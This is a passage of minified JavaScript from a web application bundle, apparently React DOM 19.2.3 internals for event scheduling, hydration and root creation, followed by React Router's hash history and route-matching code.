a.media!="string"||matchMedia(a.media).matches!==!1)&&(l.state.loading&4)===0){if(l.instance===null){var n=Ia(a.href),s=t.querySelector(Qn(n));if(s){t=s._p,t!==null&&typeof t=="object"&&typeof t.then=="function"&&(e.count++,e=xo.bind(e),t.then(e,e)),l.state.loading|=4,l.instance=s,Ze(s);return}s=t.ownerDocument||t,a=ph(a),(n=Ot.get(n))&&Kr(a,n),s=s.createElement("link"),Ze(s);var c=s;c._p=new Promise(function(h,b){c.onload=h,c.onerror=b}),et(s,"link",a),l.instance=s}e.stylesheets===null&&(e.stylesheets=new Map),e.stylesheets.set(l,t),(t=l.state.preload)&&(l.state.loading&3)===0&&(e.count++,l=xo.bind(e),t.addEventListener("load",l),t.addEventListener("error",l))}}var Jr=0;function hx(e,t){return e.stylesheets&&e.count===0&&vo(e,e.stylesheets),0<e.count||0<e.imgCount?function(l){var a=setTimeout(function(){if(e.stylesheets&&vo(e,e.stylesheets),e.unsuspend){var s=e.unsuspend;e.unsuspend=null,s()}},6e4+t);0<e.imgBytes&&Jr===0&&(Jr=62500*Kg());var n=setTimeout(function(){if(e.waitingForImages=!1,e.count===0&&(e.stylesheets&&vo(e,e.stylesheets),e.unsuspend)){var s=e.unsuspend;e.unsuspend=null,s()}},(e.imgBytes>Jr?50:800)+t);return e.unsuspend=l,function(){e.unsuspend=null,clearTimeout(a),clearTimeout(n)}}:null}function xo(){if(this.count--,this.count===0&&(this.imgCount===0||!this.waitingForImages)){if(this.stylesheets)vo(this,this.stylesheets);else if(this.unsuspend){var e=this.unsuspend;this.unsuspend=null,e()}}}var bo=null;function vo(e,t){e.stylesheets=null,e.unsuspend!==null&&(e.count++,bo=new Map,t.forEach(px,e),bo=null,xo.call(e))}function px(e,t){if(!(t.state.loading&4)){var l=bo.get(e);if(l)var a=l.get(null);else{l=new Map,bo.set(e,l);for(var n=e.querySelectorAll("link[data-precedence],style[data-precedence]"),s=0;s<n.length;s++){var c=n[s];(c.nodeName==="LINK"||c.getAttribute("media")!=="not all")&&(l.set(c.dataset.precedence,c),a=c)}a&&l.set(null,a)}n=t.instance,c=n.getAttribute("data-precedence"),s=l.get(c)||a,s===a&&l.set(null,n),l.set(c,n),this.count++,a=xo.bind(this),n.addEventListener("load",a),n.addEventListener("error",a),s?s.parentNode.insertBefore(n,s.nextSibling):(e=e.nodeType===9?e.head:e,e.insertBefore(n,e.firstChild)),t.state.loading|=4}}var Zn={$$typeof:J,Provider:null,Consumer:null,_currentValue:U,_currentValue2:U,_threadCount:0};function mx(e,t,l,a,n,s,c,h,b){this.tag=1,this.containerInfo=e,this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.next=this.pendingContext=this.context=this.cancelPendingCommit=null,this.callbackPriority=0,this.expirationTimes=Po(-1),this.entangledLanes=this.shellSuspendCounter=this.errorRecoveryDisabledLanes=this.expiredLanes=this.warmLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Po(0),this.hiddenUpdates=Po(null),this.identifierPrefix=a,this.onUncaughtError=n,this.onCaughtError=s,this.onRecoverableError=c,this.pooledCache=null,this.pooledCacheLanes=0,this.formState=b,this.incompleteTransitions=new Map}function vh(e,t,l,a,n,s,c,h,b,C,D,k){return e=new mx(e,t,l,c,b,C,D,k,h),t=1,s===!0&&(t|=24),s=vt(3,null,null,t),e.current=s,s.stateNode=e,t=wi(),t.refCount++,e.pooledCache=t,t.refCount++,s.memoizedState={element:a,isDehydrated:l,cache:t},_i(s),e}function yh(e){return e?(e=Ma,e):Ma}function Sh(e,t,l,a,n,s){n=yh(n),a.context===null?a.context=n:a.pendingContext=n,a=wl(t),a.payload={element:l},s=s===void 0?null:s,s!==null&&(a.callback=s),l=Rl(e,a,t),l!==null&&(ft(l,e,t),jn(l,e,t))}function Ah(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var l=e.retryLane;e.retryLane=l!==0&&l<t?l:t}}function Wr(e,t){Ah(e,t),(e=e.alternate)&&Ah(e,t)}function Th(e){if(e.tag===13||e.tag===31){var t=ta(e,67108864);t!==null&&ft(t,e,67108864),Wr(e,67108864)}}function Eh(e){if(e.tag===13||e.tag===31){var t=Et();t=Xo(t);var l=ta(e,t);l!==null&&ft(l,e,t),Wr(e,t)}}var yo=!0;function gx(e,t,l,a){var n=M.T;M.T=null;var s=G.p;try{G.p=2,Fr(e,t,l,a)}finally{G.p=s,M.T=n}}function xx(e,t,l,a){var n=M.T;M.T=null;var s=G.p;try{G.p=8,Fr(e,t,l,a)}finally{G.p=s,M.T=n}}function Fr(e,t,l,a){if(yo){var n=Ir(a);if(n===null)Lr(e,t,a,So,l),jh(e,a);else if(vx(n,e,t,l,a))a.stopPropagation();else if(jh(e,a),t&4&&-1<bx.indexOf(e)){for(;n!==null;){var s=va(n);if(s!==null)switch(s.tag){case 3:if(s=s.stateNode,s.current.memoizedState.isDehydrated){var c=Wl(s.pendingLanes);if(c!==0){var h=s;for(h.pendingLanes|=2,h.entangledLanes|=2;c;){var b=1<<31-xt(c);h.entanglements[1]|=b,c&=~b}Xt(s),(ye&6)===0&&(lo=mt()+500,Yn(0))}}break;case 31:case 13:h=ta(s,2),h!==null&&ft(h,s,2),no(),Wr(s,2)}if(s=Ir(a),s===null&&Lr(e,t,a,So,l),s===n)break;n=s}n!==null&&a.stopPropagation()}else Lr(e,t,a,null,l)}}function Ir(e){return e=ei(e),$r(e)}var So=null;function $r(e){if(So=null,e=ba(e),e!==null){var t=p(e);if(t===null)e=null;else{var l=t.tag;if(l===13){if(e=x(t),e!==null)return e;e=null}else if(l===31){if(e=v(t),e!==null)return e;e=null}else if(l===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null)}}return So=e,null}function Nh(e){switch(e){case"beforetoggle":case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"toggle":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 2;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 8;case"message":switch(am()){case _c:return 2;case zc:return 8;case cs:case nm:return 32;case Oc:return 268435456;default:return 32}default:return 32}}var ec=!1,Gl=null,ql=null,Yl=null,Jn=new Map,Wn=new Map,Vl=[],bx="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");function jh(e,t){switch(e){case"focusin":case"focusout":Gl=null;break;case"dragenter":case"dragleave":ql=null;break;case"mouseover":case"mouseout":Yl=null;break;case"pointerover":case"pointerout":Jn.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":Wn.delete(t.pointerId)}}function Fn(e,t,l,a,n,s){return e===null||e.nativeEvent!==s?(e={blockedOn:t,domEventName:l,eventSystemFlags:a,nativeEvent:s,targetContainers:[n]},t!==null&&(t=va(t),t!==null&&Th(t)),e):(e.eventSystemFlags|=a,t=e.targetContainers,n!==null&&t.indexOf(n)===-1&&t.push(n),e)}function vx(e,t,l,a,n){switch(t){case"focusin":return Gl=Fn(Gl,e,t,l,a,n),!0;case"dragenter":return ql=Fn(ql,e,t,l,a,n),!0;case"mouseover":return Yl=Fn(Yl,e,t,l,a,n),!0;case"pointerover":var s=n.pointerId;return Jn.set(s,Fn(Jn.get(s)||null,e,t,l,a,n)),!0;case"gotpointercapture":return s=n.pointerId,Wn.set(s,Fn(Wn.get(s)||null,e,t,l,a,n)),!0}return!1}function Ch(e){var t=ba(e.target);if(t!==null){var l=p(t);if(l!==null){if(t=l.tag,t===13){if(t=x(l),t!==null){e.blockedOn=t,Gc(e.priority,function(){Eh(l)});return}}else if(t===31){if(t=v(l),t!==null){e.blockedOn=t,Gc(e.priority,function(){Eh(l)});return}}else if(t===3&&l.stateNode.current.memoizedState.isDehydrated){e.blockedOn=l.tag===3?l.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Ao(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var l=Ir(e.nativeEvent);if(l===null){l=e.nativeEvent;var a=new l.constructor(l.type,l);$o=a,l.target.dispatchEvent(a),$o=null}else return t=va(l),t!==null&&Th(t),e.blockedOn=l,!1;t.shift()}return!0}function wh(e,t,l){Ao(e)&&l.delete(t)}function yx(){ec=!1,Gl!==null&&Ao(Gl)&&(Gl=null),ql!==null&&Ao(ql)&&(ql=null),Yl!==null&&Ao(Yl)&&(Yl=null),Jn.forEach(wh),Wn.forEach(wh)}function To(e,t){e.blockedOn===t&&(e.blockedOn=null,ec||(ec=!0,o.unstable_scheduleCallback(o.unstable_NormalPriority,yx)))}var Eo=null;function Rh(e){Eo!==e&&(Eo=e,o.unstable_scheduleCallback(o.unstable_NormalPriority,function(){Eo===e&&(Eo=null);for(var t=0;t<e.length;t+=3){var l=e[t],a=e[t+1],n=e[t+2];if(typeof a!="function"){if($r(a||l)===null)continue;break}var s=va(l);s!==null&&(e.splice(t,3),t-=3,Ii(s,{pending:!0,data:n,method:l.method,action:a},a,n))}}))}function en(e){function t(b){return To(b,e)}Gl!==null&&To(Gl,e),ql!==null&&To(ql,e),Yl!==null&&To(Yl,e),Jn.forEach(t),Wn.forEach(t);for(var l=0;l<Vl.length;l++){var a=Vl[l];a.blockedOn===e&&(a.blockedOn=null)}for(;0<Vl.length&&(l=Vl[0],l.blockedOn===null);)Ch(l),l.blockedOn===null&&Vl.shift();if(l=(e.ownerDocument||e).$$reactFormReplay,l!=null)for(a=0;a<l.length;a+=3){var n=l[a],s=l[a+1],c=n[ot]||null;if(typeof s=="function")c||Rh(l);else if(c){var h=null;if(s&&s.hasAttribute("formAction")){if(n=s,c=s[ot]||null)h=c.formAction;else if($r(n)!==null)continue}else h=c.action;typeof h=="function"?l[a+1]=h:(l.splice(a,3),a-=3),Rh(l)}}}function Mh(){function e(s){s.canIntercept&&s.info==="react-transition"&&s.intercept({handler:function(){return new Promise(function(c){return n=c})},focusReset:"manual",scroll:"manual"})}function t(){n!==null&&(n(),n=null),a||setTimeout(l,20)}function l(){if(!a&&!navigation.transition){var s=navigation.currentEntry;s&&s.url!=null&&navigation.navigate(s.url,{state:s.getState(),info:"react-transition",history:"replace"})}}if(typeof navigation=="object"){var a=!1,n=null;return navigation.addEventListener("navigate",e),navigation.addEventListener("navigatesuccess",t),navigation.addEventListener("navigateerror",t),setTimeout(l,100),function(){a=!0,navigation.removeEventListener("navigate",e),navigation.removeEventListener("navigatesuccess",t),navigation.removeEventListener("navigateerror",t),n!==null&&(n(),n=null)}}}function tc(e){this._internalRoot=e}No.prototype.render=tc.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(r(409));var l=t.current,a=Et();Sh(l,a,e,t,null,null)},No.prototype.unmount=tc.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;Sh(e.current,2,null,e,null,null),no(),t[xa]=null}};function No(e){this._internalRoot=e}No.prototype.unstable_scheduleHydration=function(e){if(e){var t=Bc();e={blockedOn:null,target:e,priority:t};for(var l=0;l<Vl.length&&t!==0&&t<Vl[l].priority;l++);Vl.splice(l,0,e),l===0&&Ch(e)}};var Dh=u.version;if(Dh!=="19.2.3")throw Error(r(527,Dh,"19.2.3"));G.findDOMNode=function(e){var t=e._reactInternals;if(t===void 0)throw typeof e.render=="function"?Error(r(188)):(e=Object.keys(e).join(","),Error(r(268,e)));return e=m(t),e=e!==null?T(e):null,e=e===null?null:e.stateNode,e};var Sx={bundleType:0,version:"19.2.3",rendererPackageName:"react-dom",currentDispatcherRef:M,reconcilerVersion:"19.2.3"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var jo=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!jo.isDisabled&&jo.supportsFiber)try{sn=jo.inject(Sx),gt=jo}catch{}}return $n.createRoot=function(e,t){if(!f(e))throw Error(r(299));var l=!1,a="",n=Ld,s=Ud,c=Bd;return t!=null&&(t.unstable_strictMode===!0&&(l=!0),t.identifierPrefix!==void 0&&(a=t.identifierPrefix),t.onUncaughtError!==void 0&&(n=t.onUncaughtError),t.onCaughtError!==void 0&&(s=t.onCaughtError),t.onRecoverableError!==void 0&&(c=t.onRecoverableError)),t=vh(e,1,!1,null,null,l,a,null,n,s,c,Mh),e[xa]=t.current,Hr(e),new tc(t)},$n.hydrateRoot=function(e,t,l){if(!f(e))throw Error(r(299));var a=!1,n="",s=Ld,c=Ud,h=Bd,b=null;return l!=null&&(l.unstable_strictMode===!0&&(a=!0),l.identifierPrefix!==void 0&&(n=l.identifierPrefix),l.onUncaughtError!==void 0&&(s=l.onUncaughtError),l.onCaughtError!==void 0&&(c=l.onCaughtError),l.onRecoverableError!==void 0&&(h=l.onRecoverableError),l.formState!==void 0&&(b=l.formState)),t=vh(e,1,!0,t,l??null,a,n,b,s,c,h,Mh),t.context=yh(null),l=t.current,a=Et(),a=Xo(a),n=wl(a),n.callback=null,Rl(l,n,a),l=a,t.current.lanes=l,rn(t,l),Xt(t),e[xa]=t.current,Hr(e),new No(t)},$n.version="19.2.3",$n}var qh;function kx(){if(qh)return nc.exports;qh=1;function o(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(o)}catch(u){console.error(u)}}return o(),nc.exports=Ox(),nc.exports}var Hx=kx();var Yh="popstate";function Vh(o){return typeof o=="object"&&o!=null&&"pathname"in o&&"search"in o&&"hash"in o&&"state"in o&&"key"in o}function Lx(o={}){function u(f,p){let{pathname:x="/",search:v="",hash:g=""}=ga(f.location.hash.substring(1));return!x.startsWith("/")&&!x.startsWith(".")&&(x="/"+x),pc("",{pathname:x,search:v,hash:g},p.state&&p.state.usr||null,p.state&&p.state.key||"default")}function d(f,p){let x=f.document.querySelector("base"),v="";if(x&&x.getAttribute("href")){let g=f.location.href,m=g.indexOf("#");v=m===-1?g:g.slice(0,m)}return v+"#"+(typeof p=="string"?p:as(p))}function r(f,p){Gt(f.pathname.charAt(0)==="/",`relative pathnames are not supported in hash history.push(${JSON.stringify(p)})`)}return Bx(u,d,r,o)}function ke(o,u){if(o===!1||o===null||typeof o>"u")throw new Error(u)}function Gt(o,u){if(!o){typeof console<"u"&&console.warn(u);try{throw new Error(u)}catch{}}}function Ux(){return Math.random().toString(36).substring(2,10)}function Ph(o,u){return{usr:o.state,key:o.key,idx:u,masked:o.mask?{pathname:o.pathname,search:o.search,hash:o.hash}:void 0}}function pc(o,u,d=null,r,f){return{pathname:typeof o=="string"?o:o.pathname,search:"",hash:"",...typeof u=="string"?ga(u):u,state:d,key:u&&u.key||r||Ux(),mask:f}}function as({pathname:o="/",search:u="",hash:d=""}){return u&&u!=="?"&&(o+=u.charAt(0)==="?"?u:"?"+u),d&&d!=="#"&&(o+=d.charAt(0)==="#"?d:"#"+d),o}function ga(o){let u={};if(o){let d=o.indexOf("#");d>=0&&(u.hash=o.substring(d),o=o.substring(0,d));let r=o.indexOf("?");r>=0&&(u.search=o.substring(r),o=o.substring(0,r)),o&&(u.pathname=o)}return u}function Bx(o,u,d,r={}){let{window:f=document.defaultView,v5Compat:p=!1}=r,x=f.history,v="POP",g=null,m=T();m==null&&(m=0,x.replaceState({...x.state,idx:m},""));function T(){return(x.state||{idx:null}).idx}function A(){v="POP";let H=T(),Z=H==null?null:H-m;m=H,g&&g({action:v,location:L.location,delta:Z})}function z(H,Z){v="PUSH";let I=Vh(H)?H:pc(L.location,H,Z);d&&d(I,H),m=T()+1;let J=Ph(I,m),se=L.createHref(I.mask||I);try{x.pushState(J,"",se)}catch(ee){if(ee instanceof DOMException&&ee.name==="DataCloneError")throw ee;f.location.assign(se)}p&&g&&g({action:v,location:L.location,delta:1})}function V(H,Z){v="REPLACE";let I=Vh(H)?H:pc(L.location,H,Z);d&&d(I,H),m=T();let J=Ph(I,m),se=L.createHref(I.mask||I);x.replaceState(J,"",se),p&&g&&g({action:v,location:L.location,delta:0})}function q(H){return Gx(f,H)}let L={get action(){return v},get location(){return o(f,x)},listen(H){if(g)throw new Error("A history only accepts one active listener");return f.addEventListener(Yh,A),g=H,()=>{f.removeEventListener(Yh,A),g=null}},createHref(H){return u(f,H)},createURL:q,encodeLocation(H){let Z=q(H);return{pathname:Z.pathname,search:Z.search,hash:Z.hash}},push:z,replace:V,go(H){return x.go(H)}};return L}function Gx(o,u,d=!1){let r="http://localhost";o&&(r=o.location.origin!=="null"?o.location.origin:o.location.href),ke(r,"No window.location.(origin|href) available to create URL");let f=typeof u=="string"?u:as(u);return f=f.replace(/ $/,"%20"),!d&&f.startsWith("//")&&(f=r+f),new URL(f,r)}function rp(o,u,d="/"){return qx(o,u,d,!1)}function qx(o,u,d,r,f){let p=typeof u=="string"?ga(u):u,x=gl(p.pathname||"/",d);if(x==null)return null;let v=Yx(o),g=null,m=eb(x);for(let T=0;g==null&&T<v.length;++T)g=Ix(v[T],m,r);return g}function Yx(o){let u=cp(o);return Vx(u),u}function cp(o,u=[],d=[],r="",f=!1){let p=(x,v,g=f,m)=>{let T={relativePath:m===void 0?x.path||"":m,caseSensitive:x.caseSensitive===!0,childrenIndex:v,route:x};if(T.relativePath.startsWith("/")){if(!T.relativePath.startsWith(r)&&g)return;ke(T.relativePath.startsWith(r),`Absolute route path "${T.relativePath}" nested under path "${r}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`),T.relativePath=T.relativePath.slice(r.length)}let A=Bt([r,T.relativePath]),z=d.concat(T);x.children&&x.children.length>0&&(ke(x.index!==!0,`Index routes must not have child routes. Please remove all child routes from route path "${A}".`),cp(x.children,u,z,A,g)),!(x.path==null&&!x.index)&&u.push({path:A,score:Wx(A,x.index),routesMeta:z})};return o.forEach((x,v)=>{if(x.path===""||!x.path?.includes("?"))p(x,v);else for(let g of up(x.path))p(x,v,!0,g)}),u}function up(o){let u=o.split("/");if(u.length===0)return[];let[d,...r]=u,f=d.endsWith("?"),p=d.replace(/\?$/,"");if(r.length===0)return f?[p,""]:[p];let x=up(r.join("/")),v=[];return v.push(...x.map(g=>g===""?p:[p,g].join("/"))),f&&v.push(...x),v.map(g=>o.startsWith("/")&&g===""?"/":g)}function Vx(o){o.sort((u,d)=>u.score!==d.score?d.score-u.score:Fx(u.routesMeta.map(r=>r.childrenIndex),d.routesMeta.map(r=>r.childrenIndex)))}var Px=/^:[\w-]+$/,Xx=3,Qx=2,Kx=1,Zx=10,Jx=-2,Xh=o=>o==="*";function Wx(o,u){let d=o.split("/"),r=d.length;return d.some(Xh)&&(r+=Jx),u&&(r+=Qx),d.filter(f=>!Xh(f)).reduce((f,p)=>f+(Px.test(p)?Xx:p===""?Kx:Zx),r)}function Fx(o,u){return o.length===u.length&&o.slice(0,-1).every((r,f)=>r===u[f])?o[o.length-1]-u[u.length-1]:0}function Ix(o,u,d=!1){let{routesMeta:r}=o,f={},p="/",x=[];for(let v=0;v<r.length;++v){let g=r[v],m=v===r.length-1,T=p==="/"?u:u.slice(p.length)||"/",A=_o({path:g.relativePath,caseSensitive:g.caseSensitive,end:m},T),z=g.route;if(!A&&m&&d&&!r[r.length-1].route.index&&(A=_o({path:g.relativePath,caseSensitive:g.caseSensitive,end:!1},T)),!A)return null;Object.assign(f,A.params),x.push({params:f,pathname:Bt([p,A.pathname]),pathnameBase:nb(Bt([p,A.pathnameBase])),route:z}),A.pathnameBase!=="/"&&(p=Bt([p,A.pathnameBase]))}return x}function _o(o,u){typeof o=="string"&&(o={path:o,caseSensitive:!1,end:!0});let[d,r]=$x(o.path,o.caseSensitive,o.end),f=u.match(d);if(!f)return null;let p=f[0],x=p.replace(/(.)\/+$/,"$1"),v=f.slice(1);return{params:r.reduce((m,{paramName:T,isOptional:A},z)=>{if(T==="*"){let q=v[z]||"";x=p.slice(0,p.length-q.length).replace(/(.)\/+$/,"$1")}const V=v[z];return A&&!V?m[T]=void 0:m[T]=(V||"").replace(/%2F/g,"/"),m},{}),pathname:p,pathnameBase:x,pattern:o}}function $x(o,u=!1,d=!0){Gt(o==="*"||!o.endsWith("*")||o.endsWith("/*"),`Route path "${o}" will be treated as if it were "${o.replace(/\*$/,"/*")}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${o.replace(/\*$/,"/*")}".`);let r=[],f="^"+o.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(x,v,g,m,T)=>{if(r.push({paramName:v,isOptional:g!=null}),g){let A=T.charAt(m+x.length);return A&&A!=="/"?"/([^\\/]*)":"(?:/([^\\/]*))?"}return"/([^\\/]+)"}).replace(/\/([\w-]+)\?(\/|$)/g,"(/$1)?$2");return o.endsWith("*")?(r.push({paramName:"*"}),f+=o==="*"||o==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):d?f+="\\/*$":o!==""&&o!=="/"&&(f+="(?:(?=\\/|$))"),[new RegExp(f,u?void 0:"i"),r]}function eb(o){try{return o.split("/").map(u=>decodeURIComponent(u).replace(/\//g,"%2F")).join("/")}catch(u){return Gt(!1,`The URL path "${o}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${u}).`),o}}function gl(o,u){if(u==="/")return o;if(!o.toLowerCase().startsWith(u.toLowerCase()))return null;let d=u.endsWith("/")?u.length-1:u.length,r=o.charAt(d);return r&&r!=="/"?null:o.slice(d)||"/"}var tb=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i;function lb(o,u="/"){let{pathname:d,search:r="",hash:f=""}=typeof o=="string"?ga(o):o,p;return d?(d=fp(d),d.startsWith("/")?p=Qh(d.substring(1),"/"):p=Qh(d,u)):p=u,{pathname:p,search:sb(r),hash:ob(f)}}function Qh(o,u){let d=zo(u).split("/");return o.split("/").forEach(f=>{f===".."?d.length>1&&d.pop():f!=="."&&d.push(f)}),d.length>1?d.join("/"):"/"}function rc(o,u,d,r){return`Cannot include a '${o}' character in a manually specified \`to.${u}\` field [${JSON.stringify(r)}].  Please separate it out to the \`to.${d}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`}function ab(o){return o.filter((u,d)=>d===0||u.route.path&&u.route.path.length>0)}function dp(o){let u=ab(o);return u.map((d,r)=>r===u.length-1?d.pathname:d.pathnameBase)}function yc(o,u,d,r=!1){let f;typeof o=="string"?f=ga(o):(f={...o},ke(!f.pathname||!f.pathname.includes("?"),rc("?","pathname","search",f)),ke(!f.pathname||!f.pathname.includes("#"),rc("#","pathname","hash",f)),ke(!f.search||!f.search.includes("#"),rc("#","search","hash",f)));let p=o===""||f.pathname==="",x=p?"/":f.pathname,v;if(x==null)v=d;else{let A=u.length-1;if(!r&&x.startsWith("..")){let z=x.split("/");for(;z[0]==="..";)z.shift(),A-=1;f.pathname=z.join("/")}v=A>=0?u[A]:"/"}let g=lb(f,v),m=x&&x!=="/"&&x.endsWith("/"),T=(p||x===".")&&d.endsWith("/");return!g.pathname.endsWith("/")&&(m||T)&&(g.pathname+="/"),g}var fp=o=>o.replace(/\/\/+/g,"/"),Bt=o=>fp(o.join("/")),zo=o=>o.replace(/\/+$/,""),nb=o=>zo(o).replace(/^\/*/,"/"),sb=o=>!o||o==="?"?"":o.startsWith("?")?o:"?"+o,ob=o=>!o||o==="#"?"":o.startsWith("#")?o:"#"+o,ib=class{constructor(o,u,d,r=!1){this.status=o,this.statusText=u||"",this.internal=r,d instanceof Error?(this.data=d.toString(),this.error=d):this.data=d}};function rb(o){return o!=null&&typeof o.status=="number"&&typeof o.statusText=="string"&&typeof o.internal=="boolean"&&"data"in o}function cb(o){let u=o.map(d=>d.route.path).filter(Boolean);return Bt(u)||"/"}var hp=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u";function pp(o,u){let d=o;if(typeof d!="string"||!tb.test(d))return{absoluteURL:void 0,isExternal:!1,to:d};let r=d,f=!1;if(hp)try{let p=new URL(window.location.href),x=d.startsWith("//")?new URL(p.protocol+d):new URL(d),v=gl(x.pathname,u);x.origin===p.origin&&v!=null?d=v+x.search+x.hash:f=!0}catch{Gt(!1,`<Link to="${d}"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.`)}return{absoluteURL:r,isExternal:f,to:d}}Object.getOwnPropertyNames(Object.prototype).sort().join("\0");var mp=["POST","PUT","PATCH","DELETE"];new Set(mp);var ub=["GET",...mp];new Set(ub);var ln=N.createContext(null);ln.displayName="DataRouter";var Ho=N.createContext(null);Ho.displayName="DataRouterState";var gp=N.createContext(!1);function db(){return N.useContext(gp)}var xp=N.createContext({isTransitioning:!1});xp.displayName="ViewTransition";var fb=N.createContext(new Map);fb.displayName="Fetchers";var hb=N.createContext(null);hb.displayName="Await";var kt=N.createContext(null);kt.displayName="Navigation";var ss=N.createContext(null);ss.displayName="Location";var Qt=N.createContext({outlet:null,matches:[],isDataRoute:!1});Qt.displayName="Route";var Sc=N.createContext(null);Sc.displayName="RouteError";var bp="REACT_ROUTER_ERROR",pb="REDIRECT",mb="ROUTE_ERROR_RESPONSE";function gb(o){if(o.startsWith(`${bp}:${pb}:{`))try{let u=JSON.parse(o.slice(28));if(typeof u=="object"&&u&&typeof u.status=="number"&&typeof u.statusText=="string"&&typeof u.location=="string"&&typeof u.reloadDocument=="boolean"&&typeof u.replace=="boolean")return u}catch{}}function xb(o){if(o.startsWith(`${bp}:${mb}:{`))try{let u=JSON.parse(o.slice(40));if(typeof u=="object"&&u&&typeof u.status=="number"&&typeof u.statusText=="string")return new ib(u.status,u.statusText,u.data)}catch{}}function bb(o,{relative:u}={}){ke(os(),"useHref() may be used only in the context of a <Router> component.");let{basename:d,navigator:r}=N.useContext(kt),{hash:f,pathname:p,search:x}=is(o,{relative:u}),v=p;return d!=="/"&&(v=p==="/"?d:Bt([d,p])),r.createHref({pathname:v,search:x,hash:f})}function os(){return N.useContext(ss)!=null}function Kt(){return ke(os(),"useLocation() may be used only in the context of a <Router> component."),N.useContext(ss).location}var vp="You should call navigate() in a React.useEffect(), not when your component is first rendered.";function yp(o){N.useContext(kt).static||N.useLayoutEffect(o)}function vb(){let{isDataRoute:o}=N.useContext(Qt);return o?zb():yb()}function yb(){ke(os(),"useNavigate() may be used only in the context of a <Router> component.");let o=N.useContext(ln),{basename:u,navigator:d}=N.useContext(kt),{matches:r}=N.useContext(Qt),{pathname:f}=Kt(),p=JSON.stringify(dp(r)),x=N.useRef(!1);return yp(()=>{x.current=!0}),N.useCallback((g,m={})=>{if(Gt(x.current,vp),!x.current)return;if(typeof g=="number"){d.go(g);return}let T=yc(g,JSON.parse(p),f,m.relative==="path");o==null&&u!=="/"&&(T.pathname=T.pathname==="/"?u:Bt([u,T.pathname])),(m.replace?d.replace:d.push)(T,m.state,m)},[u,d,p,f,o])}N.createContext(null);function Sb(){let{matches:o}=N.useContext(Qt);return o[o.length-1]?.params??{}}function is(o,{relative:u}={}){let{matches:d}=N.useContext(Qt),{pathname:r}=Kt(),f=JSON.stringify(dp(d));return N.useMemo(()=>yc(o,JSON.parse(f),r,u==="path"),[o,f,r,u])}function Ab(o,u){return Sp(o,u)}function Sp(o,u,d){ke(os(),"useRoutes() may be used only in the context of a <Router> component.");let{navigator:r}=N.useContext(kt),{matches:f}=N.useContext(Qt),p=f[f.length-1],x=p?p.params:{},v=p?p.pathname:"/",g=p?p.pathnameBase:"/",m=p&&p.route;{let H=m&&m.path||"";Tp(v,!m||H.endsWith("*")||H.endsWith("*?"),`You rendered descendant <Routes> (or called \`useRoutes()\`) at "${v}" (under <Route path="${H}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${H}"> to <Route path="${H==="/"?"*":`${H}/*`}">.`)}let T=Kt(),A;if(u){let H=typeof u=="string"?ga(u):u;ke(g==="/"||H.pathname?.startsWith(g),`When overriding the location using \`<Routes location>\` or \`useRoutes(routes, location)\`, the location pathname must begin with the portion of the URL pathname that was matched by all parent routes. The current pathname base is "${g}" but pathname "${H.pathname}" was given in the \`location\` prop.`),A=H}else A=T;let z=A.pathname||"/",V=z;if(g!=="/"){let H=g.replace(/^\//,"").split("/");V="/"+z.replace(/^\//,"").split("/").slice(H.length).join("/")}let q=d&&d.state.matches.length?d.state.matches.map(H=>Object.assign(H,{route:d.manifest[H.route.id]||H.route})):rp(o,{pathname:V});Gt(m||q!=null,`No routes matched location "${A.pathname}${A.search}${A.hash}" `),Gt(q==null||q[q.length-1].route.element!==void 0||q[q.length-1].route.Component!==void 0||q[q.length-1].route.lazy!==void 0,`Matched leaf route at location "${A.pathname}${A.search}${A.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`);let 